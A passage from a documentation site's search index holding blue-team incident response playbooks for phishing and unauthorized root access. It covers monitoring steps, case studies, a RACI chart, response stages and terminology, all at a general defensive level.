Incident Review​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#57-post--incident-review","content":" Objective: Evaluate the effectiveness of the response and identify improvements. Activities: Document the incident response process, including timelines, actions taken, and outcomes.Review the effectiveness of response activities and identify gaps or deficiencies in protocols.Conduct a lesson learned meeting with the incident response team and relevant parties.Update incident response documentation based on post-event evaluation findings.Share insights and recommendations with upper management to strengthen overall security posture. Outcome: Enhanced incident response capabilities and preparedness for future phishing incidents.  ","version":"Next","tagName":"h3"},{"title":"6. Steps for Monitoring Threats​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#6-steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Establish and implement a comprehensive strategy for continuous threat monitoring specifically targeting phishing incidents. Activities: Objectives: Clearly define the objectives for threat monitoring, such as detecting phishing emails, identifying unauthorized access, and monitoring unusual network traffic indicative of phishing activities.Tools: Select appropriate security tools such as IDS/IPS (Intrusion Detection/Prevention Systems), SIEM (Security Information and Event Management) systems, EDR (Endpoint Detection and Response) solutions, and email filtering software.Baselines: Establish baselines for normal user activity, system Behavior, and network traffic patterns to identify deviations that may indicate phishing presence. Outcome: A well-defined monitoring strategy aligned with Redback Operations' goals, enhancing the ability to detect and respond to phishing threats effectively.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Deploy and configure monitoring tools across the organization’s infrastructure to detect phishing threats. Activities: Install and Configure Tools: Deploy the selected monitoring tools across networks, systems, and endpoints. Ensure they are configured to detect phishing-related activities and collect relevant data.Integrate with Threat Intelligence: Integrate monitoring tools with threat intelligence feeds to enhance the detection of known and emerging phishing threats.Enable Logging: Ensure logging is enabled on critical systems, networks, and applications. Centralize log collection for efficient analysis and correlation. Outcome: Comprehensive deployment and integration of monitoring solutions providing detailed insights into potential phishing threats.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain continuous monitoring and analysis to promptly detect and respond to phishing threats. Activities: Real-Time Monitoring: Implement real-time monitoring to continuously observe user activities, system behavior, and network traffic, facilitating the immediate detection of phishing activities.Anomaly Detection: Utilize behavioral analytics and machine learning to identify anomalies and deviations from established baselines that may indicate phishing presence.Correlate Events: Correlate events from various sources to identify patterns that may indicate coordinated phishing attacks or persistent threats. Outcome: Enhanced capability to detect phishing threats promptly, enabling swift response to mitigate potential impacts.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#64-alerting-and-notification","content":" Objective: Ensure timely and effective response to detected threats through a robust alerting system. Activities: Set Alert Thresholds: Establish thresholds for different types of alerts based on severity and potential impact.Automated Alerts: Configure automated alerts to notify the security team of detected phishing threats. Ensure alerts provide sufficient context for prompt assessment and action.Prioritize Alerts: Implement a system to prioritize alerts based on their severity and potential impact, focusing on the most critical threats first. Outcome: Timely and effective response to detected phishing threats, reducing the risk of significant damage.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#65-investigate-and-respond","content":" Objective: Conduct thorough investigations and implement appropriate actions to mitigate identified phishing threats.  -Activities:  Initial Triage: Perform initial triage to verify the validity and potential impact of alerts. Determine the severity of the threat and whether the alert is a false positive. Detailed Analysis: Conduct in-depth analysis of confirmed alerts to understand the nature and extent of the phishing threat. Use forensic tools and techniques to gather information and trace the source of the threat. Containment and Eradication: Initiate containment measures to prevent further damage if a threat is confirmed. Execute necessary eradication procedures to remove the phishing threat from the environment. Outcome: Effective investigation and mitigation of phishing threats, ensuring minimal impact on the organization.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#66-post-incident-review","content":" Objective: Assess the effectiveness of the response and identify areas for improvement. Activities: Document Findings: Record all details of the incident, including detection, analysis, and response actions taken.Review and Improve: Conduct a review of the monitoring and response processes post-incident to identify strengths, weaknesses, and lessons learned.Update Monitoring Tools: Update monitoring tools, configurations, and thresholds based on the findings to enhance future threat detection and response capabilities. Outcome: Continuous improvement of incident response and threat monitoring processes, ensuring better preparedness for future phishing incidents.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#67-continuous-improvement","content":" Objective: Maintain and enhance the organization’s threat monitoring strategy and tools. Activities: Regular Audits: Conduct regular audits to ensure monitoring tools and strategies remain effective and up to date with the latest threats.Training and Awareness: Provide ongoing training to security personnel on the latest threats and best practices for monitoring and response.Adapt to New Threats: Continuously adapt the monitoring strategy to address emerging threats. Stay informed about the latest threat intelligence and incorporate it into monitoring processes. Outcome: A proactive and adaptive threat monitoring strategy that evolves with the changing threat landscape.  ","version":"Next","tagName":"h3"},{"title":"7. Terminology​","type":1,"pageTitle":"Phishing Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Phishing Incident Response Playbook#7-terminology","content":" Intrusion detection system (IDS): An intrusion detection system (IDS) is a security instrument that keeps an eye on system or network activity for any illegal activity or policy infractions. Phishing: The deceptive practice of sending emails, texts, or phone calls to trick individuals into disclosing sensitive information. Security Information and Event Management (SIEM): A solution called Security Information and Event Management (SIEM) offers in-the-moment security alarm analysis from network hardware and application sources. Vulnerability assessment: Vulnerability assessment is the procedure for locating, measuring, and ranking security holes in a system. Threat Intelligence: Information concerning possible or existing dangers to the security infrastructure of an organisation is known as threat intelligence. Zero-day vulnerabilities: Zero-day vulnerabilities are security holes in hardware or software that are not known to the developer or vendor, leaving attackers free to take advantage of them before a patch or remedy is made available. Social Engineering: Manipulative techniques used by attackers to trick individuals into divulging confidential information or performing certain actions. Spam Filter: A tool that identifies and filters out unsolicited and potentially harmful emails. Two-Factor Authentication (2FA): An additional security layer requiring not only a password and username but also something that only the user has on them, such as a piece of information only they should know or have immediately to hand, such as a physical token. ","version":"Next","tagName":"h2"},{"title":"Root Access Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#11-overview","content":" Root access security is a critical aspect of contemporary cybersecurity. Root access, the highest level of administrative rights in a system or network, provides unrestricted power and control. Unauthorized access to root privileges poses significant threats to the availability, confidentiality, and integrity of vital systems and data. This playbook offers a comprehensive and strategic approach to efficiently handle and resolve root access incidents.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#12-purpose","content":" The primary purpose of this playbook is to provide organizations with a strategic framework for navigating the complexities of root access incidents. It aims to equip stakeholders with the necessary information and resources to mount a coordinated and resilient response to such events, minimizing potential harm and disruption to business operations.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#13-attack-definition","content":" A root access incident refers to any situation in which unauthorized individuals obtain access to the highest level of administrative rights on a system or network. This illicit use of root access can lead to data exfiltration, system modification, service interruption, and reputational harm.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#14-scope","content":" This playbook covers all networks and systems within the organizational domain. It applies to on-premises servers, cloud-based infrastructures, legacy systems, and modern technologies, offering a flexible and scalable response structure for various environments and scenarios.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#21-insider-threat","content":" Insider threats are a dangerous and sneaky threat that arises when people who are authorised to access organisational resources misuse their access rights for malevolent intent. Insiders are a serious threat to organisational security because they can bypass established safeguards and obtain unauthorised root access by using their in-depth knowledge of systems and protocols. Their motivations might range from financial gain to ideological vendettas.  Case Study: Edward Snowden (2013)  Overview: Snowden, a former NSA contractor, leaked classified information to the public.Impact: The leaks exposed global surveillance programs and caused diplomatic tensions.Response: The NSA reviewed and enhanced its access controls and insider threat programs.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attack​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#22-external-attack","content":" Another common way that root access breaches occur is through external attacks, in which remote-operating malefactors try to overcome organisational defences and obtain root rights. These adversaries try to take advantage of weaknesses in systems and networks that are visible to the outside world by using a variety of strategies such malware distribution, exploit kits, and brute force attacks to penetrate the organisational perimeter.  Case Study: SolarWinds Attack (2020)  Overview: Attackers infiltrated SolarWinds' Orion software, impacting multiple U.S. government agencies and private companies.Impact: The breach compromised sensitive data and required extensive remediation efforts.Response: SolarWinds implemented security enhancements, including improved software development practices and threat detection capabilities.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breaches​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#23-data-breaches","content":" Incidents involving root access frequently precede data breaches, in which adversaries utilise their enhanced privileges to steal confidential and private material from company archives. These criminals use their unrestricted access to vital systems to steal, exfiltrate, and profit from priceless data assets, harming the organization's reputation and finances greatly. Their motivations may range from corporate espionage to financial gain.  Case Study: Equifax Data Breach (2017)  Overview: Attackers exploited a vulnerability in Equifax's web application framework to gain access to sensitive information.Impact: The breach exposed personal information of approximately 147 million individuals.Response: Equifax enhanced its cybersecurity practices, implemented stronger access controls, and paid a settlement of up to $700 million.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Incidents​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#24-phishing-incidents","content":" Phishing assaults are a pervasive and persistently frustrating form of cyberattack wherein adversaries utilise social engineering techniques to trick unsuspecting consumers into disclosing their login credentials or downloading harmful software. Phishing culprits aim to obtain sensitive information, such as root credentials, by posing as trustworthy organisations or forcing users to click on malicious links. This allows them to get beyond standard security measures and gain unauthorised access to organisational systems.  Case Study: Target Phishing Attack (2013)  Overview: Attackers used phishing emails to gain access to Target's network, stealing credit card information.Impact: The breach affected over 40 million customers and resulted in significant financial losses.Response: Target invested in cybersecurity improvements, including advanced threat detection and employee training programs.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attacks​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#25-ransomware-attacks","content":" The combination of cybercrime and extortion is best exemplified by ransomware assaults, in which adversaries use malicious software to encrypt important data and systems and then hold them captive until a ransom is paid. Root access criminals use their privileged access to launch ransomware campaigns that destroy corporate networks, sabotage operations, and demand astronomical costs—all of which highlight the serious repercussions of root access breaches.  Case Study: WannaCry Ransomware Attack (2017)  Overview: The WannaCry ransomware exploited a Windows vulnerability, encrypting data on affected systems.Impact: The attack affected over 200,000 computers across 150 countries, causing widespread disruption.Response: Organizations applied security patches, enhanced backup practices, and improved incident response plans.  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#26-credential-theft","content":" A nasty and widespread threat vector is credential theft, in which malicious actors use a variety of methods, including keylogging, credential phishing, and password spraying, to get user credentials—even root credentials—illegally. With these credentials in hand, attackers can pose as valid users, get around authentication restrictions, and access vital systems and resources without authorisation. This poses serious dangers to the security and integrity of the organisation.  Case Study: LinkedIn Data Breach (2012)  Overview: Hackers accessed LinkedIn's user database, stealing hashed passwords.Impact: The breach exposed millions of user credentials, leading to unauthorized access.Response: LinkedIn implemented stronger password hashing techniques and encouraged users to adopt two-factor authentication.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#3-stakeholders","content":" The proficient handling and settlement of root access incidents require the coordinated endeavours and cooperation of a heterogeneous group of stakeholders, each possessing distinct knowledge, viewpoints, and roles. The following parties are essential to the incident response process, from frontline responders entrusted with containment and mitigation to senior leadership tasked with making strategic decisions:  The incident response team, which is made up of knowledgeable cybersecurity experts, incident responders, and forensic analysts, oversees identifying, containing, and resolving access incidents. It is the front line of organisational defence.IT Security Team: Tasked with preserving the confidentiality and integrity of company data and systems, the IT security team is essential in coordinating preventative security actions in response to unusual activity and strengthening defences against root access threats.System Administrators: Using their technical know-how and domain experience to restore system integrity and functionality, system administrators, as stewards of organisational systems and networks, have a significant impact on the identification, investigation, and resolution of root access issues.Legal Department: Charged with managing the complex legal and regulatory environment that surrounds cybersecurity, the legal department offers priceless advice and assistance on contractual requirements, liability issues, and compliance obligations related to root access incidents.Management: Setting organisational priorities, allocating resources, and spearheading strategic efforts aimed at bolstering the organization's resilience against root access threats are all crucial tasks performed by executive leadership, which includes C-suite executives and senior management.External Consultants: Organisations may hire outside consultants or third-party vendors to supplement their incident response capabilities in situations requiring specific knowledge or resources. These vendors can help with forensic analysis, threat intelligence, and remediation efforts.  ","version":"Next","tagName":"h2"},{"title":"RACI Chart for Incident Response​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#raci-chart-for-incident-response","content":" Task/Activity\tIT Security Team\tIncident Response Team\tLegal and Compliance\tSystem Administrators\tManagement\tExternal ConsultantsPreparation Establish incident response team\tR, C\tA, R\tI\tI\tI\tI Develop response procedures\tA, R\tR, C\tI\tI\tI\tI Conduct training sessions\tA, R\tR\tI\tI\tI\tI Implement surveillance systems\tA, R\tR\tI\tI\tI\tI Detection Monitor system logs and traffic\tA, R\tR\tI\tI\tI\tI Use IDS and SIEM tools\tA, R\tR\tI\tI\tI\tI Analyse alerts\tA, R\tR\tI\tI\tI\tI Analysis Conduct forensic analysis\tA, R\tR\tI\tI\tI\tI Determine impact\tA, R\tR\tI\tI\tI\tI Identify threat actor tactics\tA, R\tR\tI\tI\tI\tI Containment Isolate affected systems\tA, R\tR\tI\tI\tI\tI Implement access controls\tA, R\tR\tI\tI\tI\tI Block malicious activity\tA, R\tR\tI\tI\tI\tI Eradication Remove unauthorized access\tA, R\tR\tI\tI\tI\tI Patch vulnerable systems\tA, R\tR\tI\tI\tI\tI Update security policies\tA, R\tR\tI\tI\tI\tI Recovery Restore compromised systems\tA, R\tR\tI\tI\tI\tI Recover data from backups\tA, R\tR\tI\tI\tI\tI Reconfigure networks\tA, R\tR\tI\tI\tI\tI Post-Incident Review Assess incident response\tA, R\tR\tI\tI\tI\tI Document lessons learned\tA, R\tR\tI\tI\tI\tI Update incident response protocols\tA, R\tR\tI\tI\tI\tI  Key:  R: Responsible (those who do the work)A: Accountable (those who are ultimately answerable)C: Consulted (those who provide input)I: Informed (those who are kept up to date)  ","version":"Next","tagName":"h3"},{"title":"4. Flow Chart​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#4-flow-chart","content":"   Preparation (Prep): Yellow  Notify Incident Response Team: The first steps in becoming ready to handle a root access event are taken during this phase. The incident response team is instantly contacted to initiate the response process upon detection of a root access breach. This preliminary stage is symbolised by the colour yellow, which emphasises the necessity of being ready and moving quickly.  Identification (Identify): Red  Contain the Incident; Isolate Affected Systems: At this point, the main priorities are locating the root access issue and containing it right away. Aims are set to contain the spread of unauthorised access and isolate compromised systems. Red emphasises the necessity for quick containment measures by signifying the urgency and crucial nature of this stage.  Notification (Notif): Violet  Review and Update Antivirus Definitions; Perform Full System Scans: During this phase, early mitigation actions are implemented, and pertinent parties are notified. To lessen the effects of the root access breach, precautions including comprehensive system scans and antivirus definition updates are implemented. The stage of notice and early reaction that is symbolised by the colour violet emphasises the need of taking preventative action to reduce damage.  Containment (Contain): Sky Blue  Error - Unable to Isolate; Escalate to Senior Management: In this case, attempts are made to stop additional unauthorised access and contain the root access situation. If the impacted systems cannot be isolated, top management is alerted right once so that the issue may be resolved. The containment measures intended to stop the spread of unauthorised access and stop escalation are represented by the colour sky blue.  Eradication (Erad): Light Green  Eradicate Root Access; Patch Vulnerabilities: This phase is all about fixing the underlying vulnerabilities and getting rid of unwanted access. To stop such events in the future, steps are made to remove unauthorised users and repair security flaws. Ensuring that the organization's systems are secure and removing unauthorised access are symbolised by the colour bright green.  Recovery (Recover): Brown  Monitor for Further Activity; Initiate Recovery Procedures: During this stage, the focus is on recuperating from the root access event and resuming regular operations. To find any remaining unapproved access, recovery steps are started, and continuous monitoring is carried out. The recovery phase, which aims to restore activities and strengthen security measures, is represented by the colour brown.  Post-Incident Actions (Post): Light Pink  Continue Monitoring for Threats; Conduct Regular Audits: Post-event activities are carried out in the last phase to assess the response's efficacy and pinpoint areas that require improvement. Regular audits and continuous threat monitoring are carried out to improve incident response resilience. The post-event initiatives intended to improve future response efforts and learn from the occurrence are represented by the colour light pink.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages  ​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"1. Preparation​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#1-preparation","content":" Objective: Putting in place the guidelines, practices, and tools required to handle root access issues in an efficient manner.Activities:Putting together a team for incident response with clear roles and duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Holding practice sessions and exercises on a regular basis to guarantee readiness and rehearse incident response protocols.Putting security and surveillance technologies in place to find and stop instances of root access.Outcome: A fully equipped company with the ability to react to root access events quickly and efficiently.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#52-detection","content":" Objective: Recognising warning signs of illegal access to the organization's resources and systems.Activities:Keeping an eye out for questionable activity, such as odd access patterns or unauthorised attempts at authentication.Using security information and event management (SIEM) and Intrusion detection systems (IDS) to find possible root access occurrences.Examining abnormalities and warnings to distinguish between authorised and unauthorised activity.Outcome: Rapid reaction and mitigation strategies are made possible by early root access event identification.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#53-analysis","content":" Objective: Recognising the kind and extent of the root access event.Activities:Gathering information and carrying out forensic investigation to ascertain the origin and degree of the illegal entry.Examining hacked networks and systems to find attack vectors and how they affect compromised data.Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs).Outcome: A thorough comprehension of the root access incident's origins, consequences, and accountability.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#54-containment","content":" Objective: Limiting the propagation and effects of the root access incident and stopping other illegal access or data leaks.Activities:Dividing up susceptible networks and systems to stop intruders from moving laterally.Putting safety measures and access restrictions in place to stop illegal access to sensitive data.Limiting or preventing harmful data, software, or network flow to stop more damage.Outcome: Efficient handling of the root access issue, reducing harm to the data and systems of the company.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#55-eradication","content":" Objective: Eliminating threats and any lingering vulnerabilities from the company's networks and IT systems.Activities:Removing illegal access and putting compromised systems back in a safe and secure condition.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and revising security protocols and guidelines to fix flaws or vulnerabilities found.Outcome: Elimination of all evidence of the root access incident and mitigation of vulnerabilities to stop it from happening again.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#56-recovery","content":" Objective: Restarting company operations and returning impacted systems and data to normal functioning.Activities:Restoring damaged systems and data backups to guarantee the integrity and accessibility of data.Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future.Putting user awareness and education programmes into action to reduce unauthorised access events in the future.Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post-Incident Review​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#57-post-incident-review","content":" Objective: Assessing the organization's reaction to the root access event, noting lessons learned and opportunities for improvement.Activities:Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results.Outcome: Improved preparedness for upcoming root access incidents and enhanced incident response capabilities.  ","version":"Next","tagName":"h3"},{"title":"6. Steps for Monitoring Threats​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#6-steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Develop a comprehensive strategy specifically for monitoring root access threats. Activities: Define clear objectives tailored to the detection and management of unauthorized root access.Select and deploy specialized tools designed to monitor root-level activities, such as advanced Intrusion Detection Systems (IDS), Security Information and Event Management (SIEM) systems, and Endpoint Detection and Response (EDR) solutions.Establish baselines for normal administrative and root-level user activity to differentiate between legitimate and suspicious behaviors. Outcome: A robust monitoring strategy aligned with the goal of detecting and mitigating root access threats effectively.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Implement and configure monitoring tools to detect root access threats across the organization’s infrastructure. Activities: Deploy chosen monitoring tools specifically configured to track root access activities across all critical systems and networks.Integrate monitoring tools with threat intelligence feeds to stay updated on the latest root access vulnerabilities and attack vectors.Ensure comprehensive logging of all root access attempts, successes, and failures, along with detailed recording of administrative activities. Outcome: A well-deployed set of monitoring solutions providing in-depth insights into potential root access threats.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain continuous surveillance and analysis to promptly detect and respond to unauthorized root access attempts. Activities: Implement real-time monitoring to continuously observe root-level activities, including login attempts, command executions, and privilege escalations.Utilize behavioral analytics and machine learning to identify anomalies in root access patterns, which could indicate unauthorized attempts.Correlate events from various sources to identify and prioritize potential root access threats. Outcome: Enhanced capability to detect unauthorized root access promptly, enabling swift response and mitigation.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#64-alerting-and-notification","content":" Objective: Ensure timely and effective response to detected root access threats through a robust alerting system. Activities: Establish thresholds and triggers for different types of root access alerts, considering the severity and potential impact.Configure automated alerts to notify the incident response team immediately when suspicious root access activities are detected.Implement a prioritization system for alerts to ensure that critical root access threats are addressed promptly. Outcome: Timely and effective response to detected root access threats, reducing the risk of significant damage.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#65-investigate-and-respond","content":" Objective: Conduct thorough investigations and implement appropriate actions to mitigate identified root access threats. Activities: Perform initial triage to verify the validity and potential impact of root access alerts.Conduct in-depth analysis of confirmed alerts to understand the root cause and potential extent of the threat.Initiate containment measures, such as isolating affected systems and revoking unauthorized root access and execute necessary eradication procedures. Outcome: Effective investigation and mitigation of root access threats, ensuring minimal impact on the organization.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#66-post-incident-review","content":" Objective: Assess the effectiveness of the response to root access incidents and identify areas for improvement. Activities: Record all details of the root access incident, including detection, analysis, and response actions taken.Conduct a comprehensive review of the monitoring and response processes post-incident to identify strengths and areas for improvement.Update monitoring tools, configurations, and thresholds based on findings to enhance future detection and response capabilities. Outcome: Continuous improvement of incident response and threat monitoring processes, specifically for root access incidents.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#67-continuous-improvement","content":" Objective: Maintain and enhance the organization’s strategy and tools for monitoring root access threats. Activities: Conduct regular audits to ensure the effectiveness of root access monitoring tools and strategies.Provide ongoing training to security personnel, focusing on detecting and responding to root access threats.Continuously adapt the monitoring strategy to address emerging root access threats and vulnerabilities. Outcome: A proactive and adaptive strategy for monitoring root access threats that evolves with the changing threat landscape.  ","version":"Next","tagName":"h3"},{"title":"7. Terminology​","type":1,"pageTitle":"Root Access Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Root Access Inciident Response Playbook#7-terminology","content":" Terminology in incident response encompasses a range of concepts and terms essential for effective communication and understanding within the cybersecurity domain. It provides a common language for incident responders, enabling precise and unambiguous communication during incident response activities.  Root Access: The highest level of administrative access within a system or network, granting users unrestricted control over critical resources and settings.  Incident Response: A coordinated approach to managing and mitigating the impact of security incidents, encompassing detection, analysis, containment, eradication, recovery, and post-incident review stages.  Intrusion Detection System (IDS): A security tool designed to monitor network traffic and systems for signs of unauthorized access or malicious activity, generating alerts or notifications when suspicious behavior is detected.  Intrusion Prevention System (IPS): A security solution that goes beyond detection to actively block or prevent unauthorized access or malicious activity, helping to protect systems and networks from cyber threats.  User Behavior Analytics (UBA): The process of analyzing patterns of user behavior to detect anomalies or deviations from normal activity, helping to identify potential security incidents, including unauthorized access or insider threats.  Two-Factor Authentication (2FA): An authentication method that requires users to provide two forms of identification, typically a password or PIN combined with a second factor such as a code sent to a mobile device, to access a system or service.  Credential Theft: The unauthorized acquisition of user credentials, such as usernames and passwords, through various means such as phishing attacks, keylogging, or credential stuffing, enabling attackers to gain unauthorized access to systems or accounts.  Ransomware: Malicious software designed to encrypt or lock files and systems, typically demanding payment (ransom) from the victim in exchange for decryption keys or restoring access to the affected data.  Root Cause Analysis (RCA): A methodical investigation process used to determine the underlying cause or causes of a security incident.  Least Privilege Principle: The security principle that users, processes, and systems should be granted only the minimum level of access or permissions necessary to perform their intended tasks.  Privilege Escalation: The act of increasing the level of access or permissions granted to a user or application, typically to gain unauthorized control over system resources or sensitive data.  By understanding and utilizing these key terms, incident responders can effectively communicate, collaborate, and execute incident response activities, ultimately enhancing the organization's ability to detect, respond to, and recover from security incidents. ","version":"Next","tagName":"h2"},{"title":"QEMU Raspberry Pi Simulation with Pi-hole","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue 